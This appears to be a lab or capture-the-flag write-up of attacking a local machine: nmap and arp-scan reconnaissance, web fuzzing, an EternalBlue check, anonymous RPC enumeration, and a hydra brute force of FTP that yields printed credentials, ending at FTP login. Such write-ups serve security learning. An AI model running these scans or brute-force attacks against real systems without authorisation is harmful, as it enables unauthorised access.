<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/8309287c-1280-4c6c-aab7-4751ac0c2279"></picture></h1>

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>DISCOVERING</h1>

```bash
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/96c23aba-8922-4021-9daf-b626cd3c91aa)

```bash
ping -c 1 192.168.1.154
```
![image](https://github.com/user-attachments/assets/d28063e8-0e31-4da3-a932-cad363ed36ba)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.180 -oG allports
```
![image](https://github.com/user-attachments/assets/7e2bca7c-88f6-4548-9b2c-7f3bb158aad3)

```bash
nmap -sCV -p21,80,135,139,445,49152,49153,49154,49155,49156,49157 192.168.1.180 -oN targeted
```
![image](https://github.com/user-attachments/assets/1e8cfde2-0bc6-40e0-b81d-bb7623cdf150)

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

![image](https://github.com/user-attachments/assets/f5a410d8-838e-4e26-aaf3-5adee82a12f6)

``CRTL+U``
<br>
<br>
![image](https://github.com/user-attachments/assets/1ad23d93-a26a-4787-b8b8-d1a4b15e0d24)

### **Fuzzing**
```bash
gobuster dir -u http://192.168.1.180/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/05ea476b-4c5b-4d69-a7ce-7100fca16a53)

```bash
whatweb https://192.168.1.180
```
![image](https://github.com/user-attachments/assets/a9485353-0de8-4b79-bd39-468b80a2a6aa)

### **we didn't find anything relevant**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 445</h2>

```bash
sudo nmap --script "vuln and safe" -p445 192.168.1.180
```
![image](https://github.com/user-attachments/assets/a10cfba9-81df-4752-8595-0cfb87186bdc)

### **not vulnerable to EternalBlue**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"></picture>RPC Protocol</h2>

```bash
rpcclient -U "" -N 192.168.1.180
srvinfo
querydispinfo
enumdomusers
getdompwinfo
```
![image](https://github.com/user-attachments/assets/c1825bc6-33ed-4720-8da0-ee814e5c3b52)

### **we found nothing**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 21</h2>

### **Brute Force**
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt ftp://192.168.1.180
```
![image](https://github.com/user-attachments/assets/f87eb6f4-5b0e-4b8e-bcba-339876bf1268)

USER:    info
PASSWD:  PolniyPizdec0211

### ** FTP Connection**
```bash
ftp 192.168.1.180
```
![image](https://github.com/user-attachments/assets/deac17fa-b655-4e1a-b01d-190d7f24df61)


